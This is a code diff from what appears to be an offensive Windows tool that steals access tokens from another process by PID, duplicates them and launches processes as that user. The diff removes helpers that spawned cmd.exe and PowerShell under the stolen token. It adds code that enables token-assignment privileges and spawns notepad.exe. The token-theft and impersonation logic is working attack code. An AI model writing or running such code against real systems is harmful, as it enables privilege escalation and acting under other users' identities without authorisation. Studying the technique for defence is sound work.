@@ -317,78 +317,6 @@ HANDLE getPrimaryTokenFromProcess(DWORD processId) {
     return hPrimaryToken; // Return the primary token handle
 }
 
-
-void launchProcessAsUser(HANDLE hToken) {
-    STARTUPINFO si;
-    PROCESS_INFORMATION pi;
-    ZeroMemory(&si, sizeof(si));
-    si.cb = sizeof(si);
-    ZeroMemory(&pi, sizeof(pi));
-
-    // Launch calc.exe
-    if (!CreateProcessAsUser(
-            hToken,                // User's token
-            NULL,                  // No module name (use command line)
-            "C:\\Windows\\System32\\cmd.exe", // Command line
-            NULL,                  // Process security attributes
-            NULL,                  // Primary thread security attributes
-            FALSE,                 // Handle inheritance
-            0,                     // Creation flags
-            NULL,                  // Use parent's environment block
-            NULL,                  // Use parent's starting directory 
-            &si,                   // Pointer to STARTUPINFO structure
-            &pi)                   // Pointer to PROCESS_INFORMATION structure
-    ) {
-        printf("CreateProcessAsUser failed (%d).\n", GetLastError());
-    } else {
-        // Successfully created process
-        printf("Process launched successfully.\n");
-        CloseHandle(pi.hProcess);
-        CloseHandle(pi.hThread);
-    }
-}
-
-void ExecutePowerShellAsUser(HANDLE hToken) {
-    STARTUPINFOA si;
-    PROCESS_INFORMATION pi;
-
-    // Initialize the structures
-    ZeroMemory(&si, sizeof(si));
-    si.cb = sizeof(si);
-    ZeroMemory(&pi, sizeof(pi));
-
-    // Set the startup info to create a console window
-    si.dwFlags = STARTF_USESHOWWINDOW;
-    si.wShowWindow = SW_SHOW;
-
-    // Command to execute PowerShell
-    LPCSTR command = "powershell.exe";
-
-    // Create the process with the impersonated user token
-    if (CreateProcessAsUserA(
-            hToken,           // User token
-            NULL,             // Application name
-            (LPSTR)command,   // Command line
-            NULL,             // Process security attributes
-            NULL,             // Primary thread security attributes
-            FALSE,            // Handle inheritance
-            0,                // Creation flags
-            NULL,             // Use parent's environment block
-            NULL,             // Use parent's starting directory
-            &si,              // Pointer to STARTUPINFO
-            &pi               // Pointer to PROCESS_INFORMATION
-        )) {
-        // Wait for the command to complete
-        WaitForSingleObject(pi.hProcess, INFINITE);
-
-        // Close process and thread handles
-        CloseHandle(pi.hProcess);
-        CloseHandle(pi.hThread);
-    } else {
-        printf("CreateProcessAsUser failed (%d).\n", GetLastError());
-    }
-}
-
 char *impersonate(int pid){
     char *firstUser = getName();
     STARTUPINFO si;
@@ -398,7 +326,8 @@ char *impersonate(int pid){
     char *newUser = getName();
     char *impersonation = "[+] Impersonation successfull.\r\n";
     HANDLE hUserToken;
-    
+    enableAssignPrimaryTokenPrivilege();
+    enableIncreaseQuotaPrivilege();
     if (hToken) {
         open = "[+] Obtained duplicated token.\r\n";
         
@@ -408,10 +337,25 @@ char *impersonate(int pid){
             CloseHandle(hToken);
         }
 
-        
         if (DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &hUserToken)) {
             // Prepare the PowerShell command
-            ExecutePowerShellAsUser(hToken);
+     
+            BOOL bRet = CreateProcessAsUser(hToken,
+                                            "c:\\windows\\system32\\notepad.exe",
+                                            NULL,
+                                            NULL,
+                                            NULL,
+                                            TRUE,
+                                            CREATE_NEW_CONSOLE,
+                                            NULL,
+                                            NULL,
+                                            &si,
+                                            &pi);
+            if (bRet){
+                printf("Good"); 
+            } else {
+                printf("DuplicateTokenEx failed (%d).\n", GetLastError());
+            }
             CloseHandle(hUserToken);
         } else {
             printf("DuplicateTokenEx failed (%d).\n", GetLastError());
